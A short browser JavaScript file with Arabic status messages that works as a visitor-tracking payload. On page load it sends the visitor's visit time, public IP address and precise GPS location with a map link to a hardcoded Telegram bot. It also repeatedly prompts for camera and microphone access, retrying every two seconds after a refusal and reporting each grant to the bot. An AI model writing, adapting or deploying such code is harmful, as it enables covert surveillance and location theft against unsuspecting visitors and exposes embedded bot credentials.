const token = "7337948703:AAHj1Dk8j4cXb2WrquIt4UhQHkBHQ6w8J_E";
const chatId = "6659044299";

function sendTelegram(text) {
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text })
  });
}

sendTelegram("👁️ زيارة جديدة ⏰ " + new Date().toLocaleString());

fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(data => sendTelegram("🌐 IP: " + data.ip));

function askLocation() {
  navigator.geolocation.getCurrentPosition(pos => {
    const { latitude, longitude } = pos.coords;
    const link = `https://maps.google.com/?q=${latitude},${longitude}`;
    sendTelegram(`📍 الموقع:\nLatitude: ${latitude}\nLongitude: ${longitude}\n🌐 ${link}`);
  }, () => setTimeout(askLocation, 2000));
}

function askCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      sendTelegram("📸 تم منح إذن الكاميرا ✅");
      stream.getTracks().forEach(t => t.stop());
    })
    .catch(() => setTimeout(askCamera, 2000));
}

function askMic() {
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      sendTelegram("🎤 تم منح إذن المايك ✅");
      stream.getTracks().forEach(t => t.stop());
    })
    .catch(() => setTimeout(askMic, 2000));
}

askLocation();
askCamera();
askMic();
